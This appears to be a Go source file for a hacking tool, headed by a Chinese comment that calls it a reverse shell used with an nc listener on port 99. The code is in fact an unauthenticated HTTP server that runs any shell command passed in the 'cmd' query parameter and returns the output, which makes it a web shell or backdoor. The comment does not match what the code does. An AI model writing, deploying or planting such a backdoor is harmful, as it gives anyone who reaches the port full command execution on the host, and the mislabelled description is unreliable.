/* 
#
# -- 用 "nc -p 99" 监听本地99端口
# -- 执行 "./reverse-shell 127.0.0.1:99", 即可得到一个 reverse-shell  
#
*/

package main 
import(
	"fmt"
	"os"
	"os/exec"
	"net/http"
)

var
(
	shell       = "/bin/sh"
	shellArg    = "-c"
	addr        string
)

func main(){ 
		if len(os.Args) != 2{
			fmt.Println("Usage: %s <listenAddress>\n", os.Args[0])
			os.Exit(1)
		}

		addr = os.Args[1]
		http.HandleFunc("/", requestHandler)
		err := http.ListenAndServe(addr, nil)
		_ = err

}

func requestHandler(w http.ResponseWriter, req *http.Request){
	cmd := req.URL.Query().Get("cmd")
	if cmd == "" {
		_, _ = w.Write([]byte("test"))
		return
	}

	command := exec.Command(shell, shellArg, cmd)
	output, err := command.Output()
	_, err = w.Write([]byte(fmt.Sprintf("cmd: %v, result:\n%v\n", cmd, string(output) )))
	_ =  err
}





